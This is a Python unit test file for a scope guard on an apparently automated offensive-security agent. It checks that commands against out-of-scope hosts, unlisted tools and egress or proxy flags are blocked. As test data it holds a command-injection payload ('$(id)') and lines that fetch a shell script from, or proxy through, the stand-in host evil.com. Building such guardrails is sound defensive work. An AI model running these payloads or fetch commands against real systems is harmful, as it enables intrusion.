import unittest

from modules.agent_offensive.guard import ScopeGuard, DEFAULT_ALLOW, session_scope_ok

SCOPE = {"in_scope_cidrs": ["10.1.1.0/24"], "in_scope_domains": []}


class GuardTest(unittest.TestCase):
    def g(self, **kw):
        return ScopeGuard(SCOPE, set(DEFAULT_ALLOW) | kw.get("extra", set()))

    def test_in_scope_allowed(self):
        self.assertFalse(self.g().vet(["nmap", "-Pn", "10.1.1.5"]).blocked)

    def test_out_of_scope_blocked(self):
        v = self.g().vet(["nmap", "-Pn", "10.9.9.9"])
        self.assertTrue(v.blocked)
        self.assertIn("scope", v.reason.lower())

    def test_no_target_blocked_failclosed(self):
        v = self.g().vet(["nmap", "-sV"])
        self.assertTrue(v.blocked)

    def test_unlisted_binary_blocked(self):
        v = self.g().vet(["sqlmap", "-u", "http://10.1.1.5/x"])
        self.assertTrue(v.blocked)
        self.assertIn("allow", v.reason.lower())

    def test_optin_binary_allowed(self):
        self.assertFalse(self.g(extra={"sqlmap"}).vet(["sqlmap", "-u", "http://10.1.1.5/x"]).blocked)

    def test_egress_flag_blocked(self):
        v = self.g().vet(["curl", "-o", "/tmp/x", "http://10.1.1.5/"])
        self.assertTrue(v.blocked)

    def test_proxy_redirect_blocked(self):
        v = self.g().vet(["curl", "--proxy", "http://evil.com", "http://10.1.1.5/"])
        self.assertTrue(v.blocked)

    def test_injection_payload_to_in_scope_url_allowed(self):
        # the fix that matters: exploiting an in-scope host via a payload is allowed
        v = self.g().vet(["curl", "-X", "POST", "http://10.1.1.5/internal/netcheck",
                          "--data-urlencode", "host=$(id)"])
        self.assertFalse(v.blocked)

    def test_session_local_commands_allowed(self):
        for cmd in ("id", "cat /home/web/user.txt", "sudo -l", "cat report.tar.gz",
                    "find / -perm -4000 2>/dev/null", "curl http://127.0.0.1:8080/"):
            ok, reason = session_scope_ok(cmd, SCOPE)
            self.assertTrue(ok, f"{cmd} -> {reason}")

    def test_session_in_scope_connection_allowed(self):
        ok, _ = session_scope_ok("curl http://10.1.1.5/internal", SCOPE)
        self.assertTrue(ok)

    def test_session_pivot_blocked(self):
        ok, reason = session_scope_ok("ssh user@10.9.9.9", SCOPE)
        self.assertFalse(ok)
        self.assertIn("10.9.9.9", reason)
        ok2, _ = session_scope_ok("cat x; curl http://evil.com/shell.sh", SCOPE)
        self.assertFalse(ok2)

    def test_judge_can_block_but_not_unblock(self):
        # judge says fine, but out-of-scope stays blocked
        g = ScopeGuard(SCOPE, set(DEFAULT_ALLOW), judge_fn=lambda argv: None)
        self.assertTrue(g.vet(["nmap", "10.9.9.9"]).blocked)
        # judge blocks an in-scope command
        g2 = ScopeGuard(SCOPE, set(DEFAULT_ALLOW), judge_fn=lambda argv: "destructive")
        v = g2.vet(["nmap", "10.1.1.5"])
        self.assertTrue(v.blocked)
        self.assertIn("destructive", v.reason)


if __name__ == "__main__":
    unittest.main()
